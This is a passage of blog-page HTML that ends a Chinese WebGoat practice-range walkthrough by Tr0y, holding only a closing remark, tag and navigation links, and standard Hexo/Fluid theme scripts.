+<strong>这个靶场很有意思，做完提升了不少~~ </strong><br />
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/" class="category-chain-item">过程记录</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/">#靶场</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WebGoat 靶场题解</div>
+      <div>https://www.tr0y.wang/2018/04/06/WebGoat/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2018年4月6日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2021年4月13日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/04/07/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90-WooYun/" title="SQL 注入关联分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL 注入关联分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/03/21/sqlmap-guide/" title="SQLmap 使用手册">
+                        <span class="hidden-mobile">SQLmap 使用手册</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
